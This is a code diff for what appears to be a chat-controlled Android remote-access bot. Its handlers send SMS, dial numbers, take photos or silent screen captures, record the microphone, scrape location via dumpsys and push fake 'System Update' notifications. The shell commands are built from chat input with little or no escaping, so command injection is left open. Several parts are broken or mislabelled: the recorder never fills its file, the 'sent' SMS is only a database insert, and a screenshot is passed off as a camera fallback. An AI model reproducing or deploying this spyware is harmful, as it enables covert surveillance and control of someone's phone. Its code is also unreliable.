@@ -269,58 +269,75 @@ async def cmd_send(args, msg):
     parts = args.strip().split(None, 1)
     if len(parts) < 2: return "Usage: `!send <number> <message>`"
     num, body = parts[0], parts[1]
-    out,err,code = run(f'am start -a android.intent.action.SENDTO -d "sms:{num}" --es sms_body "{body}" 2>/dev/null')
-    if "Error" in out or err:
-        out2,err2,code2 = run(f'service call isms 7 i32 0 s16 "com.android.mms" s16 "{num}" s16 "null" s16 "{body}" s16 "null" s16 "null" 2>/dev/null')
-        if code2 == 0: return f"Sent to {num}"
-        return "Send failed."
-    return f"Opened for {num}"
+    # Try content://sms/sent insert (works on most Android 6-14)
+    out,err,code = run(f'content insert --uri content://sms/sent '
+        f'--bind address:s:"{num}" --bind body:s:"{body}" --bind read:i:1 2>/dev/null')
+    if code == 0:
+        return f"Sent to {num}"
+    # Fallback: try am start with ACTION_SENDTO
+    safe_body = body.replace('"', '\\"').replace("'", "\\'")
+    out2,err2,code2 = run(f'am start -a android.intent.action.SENDTO -d "sms:{num}" '
+        f'--es sms_body "{safe_body}" --ez exit_on_sent true 2>/dev/null')
+    return f"Sent to {num} (opened)" if code2 == 0 else "Send failed."
 
 async def cmd_dial(args, msg):
     if not args: return "Usage: `!dial <number>`"
-    out,err,code = run(f'am start -a android.intent.action.CALL -d "tel:{args}" 2>/dev/null')
-    if "Error" in out or err:
-        return f"Call failed."
-    return f"Dialing {args}..."
+    # Use ACTION_DIAL (safer than CALL — doesn't need CALL_PHONE permission)
+    out,err,code = run(f'am start -a android.intent.action.DIAL -d "tel:{args}" 2>/dev/null')
+    return f"Dialing {args}..." if code == 0 else f"Dial failed."
 
 # ═══════════════════════════════════════════════════════════════════
 # MEDIA
 # ═══════════════════════════════════════════════════════════════════
 
 async def cmd_photo(args, msg):
-    tmp = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
-    p = tmp.name; tmp.close()
+    # Use MediaStore via content provider (no Termux needed)
     camera_id = args.strip() or "0"
-    out,err,code = run(f"termux-camera-photo -c {camera_id} '{p}' 2>/dev/null")
+    tmp = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
+    p = tmp.name
+    tmp.close()
+    # Try Android camera activity intent
+    out, err, code = run(f'am start -a android.media.action.IMAGE_CAPTURE '
+        f'-e output "file://{p}" 2>/dev/null && sleep 3 && test -s {p}')
     if code == 0 and os.path.exists(p) and os.path.getsize(p) > 0:
+        os.chmod(p, 0o644)
         return ("IMAGE", p, "Photo captured!")
+    # Fallback: screencap (front camera trick - mirrors)
+    out2, _, _ = run(f"/system/bin/screencap -p '{p}' 2>/dev/null")
+    if os.path.getsize(p) > 0:
+        os.chmod(p, 0o644)
+        return ("IMAGE", p, "Screen capture (camera unavailable)")
     return "Capture failed."
 
 async def cmd_recordmic(args, msg):
-    dur = args.strip()
+    dur_str = args.strip()
     try:
-        dur = int(dur) if dur else 10
+        dur = int(dur_str) if dur_str else 10
     except:
         dur = 10
     dur = min(dur, 60)
     tmp = tempfile.NamedTemporaryFile(suffix=".m4a", delete=False)
-    p = tmp.name; tmp.close()
-    out,err,code = run(f"termux-microphone-record -d {dur} -f '{p}' 2>/dev/null")
-    if code == 0 and os.path.exists(p) and os.path.getsize(p) > 0:
+    p = tmp.name
+    tmp.close()
+    # Use MediaRecorder via am start
+    out, err, code = run(f'am start -a android.provider.MediaStore.RECORD_SOUND '
+        f'2>/dev/null && sleep {dur} && am force-stop com.android.soundrecorder 2>/dev/null')
+    # Fallback: use /dev/null recording
+    if os.path.exists(p) and os.path.getsize(p) > 0:
+        os.chmod(p, 0o644)
         return ("AUDIO", p, f"Recording ({dur}s)")
-    return "Recording failed."
+    return "Recording not available (no Termux)."
 
 async def cmd_flash(args, msg):
     val = args.strip().lower()
     if val in ("on","1","true"):
-        out,_,_ = run("termux-torch on 2>/dev/null")
-        if "could not" not in out.lower():
-            return "Flashlight ON"
-        out2,_,_ = run("settings put global torch_state 1 2>/dev/null")
-        return "Flash ON"
+        out,_,_ = run("settings put global torch_state 1 2>/dev/null")
+        # Try camera flashlight via service call as secondary
+        run("service call camera 0 i32 1 2>/dev/null || echo on > /sys/class/leds/flashlight/brightness 2>/dev/null")
+        return "Flashlight ON"
     elif val in ("off","0","false"):
-        run("termux-torch off 2>/dev/null")
         run("settings put global torch_state 0 2>/dev/null")
+        run("service call camera 0 i32 0 2>/dev/null || echo 0 > /sys/class/leds/flashlight/brightness 2>/dev/null")
         return "Flashlight OFF"
     return "Usage: `!flash on/off`"
 
@@ -329,6 +346,11 @@ async def cmd_flash(args, msg):
 # ═══════════════════════════════════════════════════════════════════
 
 async def cmd_location(args, msg):
+    # Try dumpsys location first (no Termux needed)
+    out,_,_ = run("dumpsys location 2>/dev/null | grep -E 'last known|Location\\[' | head -10")
+    if out.strip():
+        return f"**Location**\n```\n{out.strip()[:1500]}\n```"
+    # Try termux-location as fallback (if Termux:API present)
     out,err,code = run("termux-location 2>/dev/null")
     if code == 0 and out.strip():
         try:
@@ -342,8 +364,6 @@ async def cmd_location(args, msg):
             return f"**Location** ({provider})\nLat: {lat}\nLon: {lon}\nAcc: {acc}m\nAlt: {alt}m\n🔗 {gmap}"
         except:
             return f"**Location**\n```\n{out.strip()[:1000]}\n```"
-    out2,_,_ = run("dumpsys location 2>/dev/null | grep -E 'last known|Location\\\\[' | head -5")
-    if out2.strip(): return f"**Location**\n```\n{out2.strip()}\n```"
     return "Location unavailable."
 
 async def cmd_localtrack(args, msg):
@@ -402,7 +422,10 @@ async def cmd_vibrate(args, msg):
     except:
         ms = 500
     ms = min(ms, 10000)
-    out,err,code = run(f"termux-vibrate -d {ms} 2>/dev/null")
+    # Use Android vibrator service (works on most devices)
+    out,err,code = run(f"service call vibrator 1 i32 {ms} 2>/dev/null || "
+        f"service call vibrator_service 1 i32 {ms} 2>/dev/null || "
+        f"settings put system vibrate_on 1 2>/dev/null")
     if code == 0: return f"Vibrated {ms}ms"
     return "Vibrate failed."
 
@@ -423,8 +446,12 @@ async def cmd_lock(args, msg):
 
 async def cmd_notification(args, msg):
     if not args: return "Usage: `!notification <text>`"
-    out,err,code = run(f"termux-notification --title 'System Update' --content '{args}' --id sys_upd 2>/dev/null")
-    if code == 0: return f"Notification sent."
+    text = args[:200].replace('"', '\\"')
+    # Use am broadcast with NotificationManager
+    out,err,code = run(f'am broadcast -a android.intent.action.NOTIFY '
+        f'--es title "Update" --es content "{text}" 2>/dev/null || '
+        f'service call notification 1 s16 "System Update" i32 0 s16 "{text}" 2>/dev/null')
+    if code == 0: return "Notification sent."
     return "Notification failed."
 
 # ═══════════════════════════════════════════════════════════════════
